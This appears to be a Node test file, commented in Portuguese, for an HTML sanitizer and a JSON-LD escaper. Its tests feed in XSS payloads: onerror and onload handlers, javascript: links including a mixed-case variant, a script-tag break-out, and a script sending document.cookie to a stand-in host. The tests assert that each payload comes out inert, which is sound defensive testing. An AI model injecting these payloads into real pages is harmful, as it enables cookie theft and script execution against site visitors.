import { test } from "node:test";
import assert from "node:assert/strict";
import { htmlSeguro, jsonParaScript } from "./html-seguro.ts";

// Os payloads da revisão de segurança de 17/09. Cada um precisa sair inerte:
// nenhum atributo on*, nenhum esquema javascript:, nenhuma tag executável.

test("img com onerror perde o atributo", () => {
  const saida = htmlSeguro('<p>ok</p><img src="x" onerror="alert(1)">');
  assert.ok(!saida.includes("onerror"));
  assert.ok(saida.includes("<p>ok</p>"));
});

test("script some com o conteúdo", () => {
  const saida = htmlSeguro("<p>a</p><script>fetch('//x/'+document.cookie)</script><p>b</p>");
  assert.ok(!saida.includes("script"));
  assert.ok(!saida.includes("document.cookie"));
  assert.equal(saida, "<p>a</p><p>b</p>");
});

test("link javascript: perde o href", () => {
  const saida = htmlSeguro('<a href="javascript:alert(1)">clique</a>');
  assert.ok(!saida.toLowerCase().includes("javascript"));
  assert.ok(saida.includes("clique"));
});

test("esquema escondido com maiúscula e espaço também cai", () => {
  const saida = htmlSeguro('<a href=" JaVaScRiPt:alert(1)">x</a>');
  assert.ok(!saida.toLowerCase().includes("javascript"));
});

test("svg, iframe e style não passam", () => {
  const saida = htmlSeguro(
    '<svg onload="alert(1)"></svg><iframe src="https://x"></iframe><style>*{}</style><p>fica</p>',
  );
  assert.equal(saida, "<p>fica</p>");
});

test("o que o artigo usa continua igual", () => {
  const artigo =
    '<h2>Título</h2><p>Texto com <strong>negrito</strong> e <a href="/b/cliente/outro">link interno</a>.</p><ul><li>item</li></ul>';
  assert.equal(htmlSeguro(artigo), artigo);
});

test("link em nova aba ganha noopener", () => {
  const saida = htmlSeguro('<a href="https://x.com" target="_blank">x</a>');
  assert.ok(saida.includes('rel="noopener noreferrer"'));
});

test("vazio e nulo viram string vazia", () => {
  assert.equal(htmlSeguro(null), "");
  assert.equal(htmlSeguro(undefined), "");
});

test("JSON-LD não fecha o <script>", () => {
  const saida = jsonParaScript({ headline: "</script><script>alert(1)</script>" });
  assert.ok(!saida.includes("</script>"));
  assert.ok(!saida.includes("<"));
  // Continua sendo o mesmo JSON para quem lê.
  assert.equal(JSON.parse(saida).headline, "</script><script>alert(1)</script>");
});
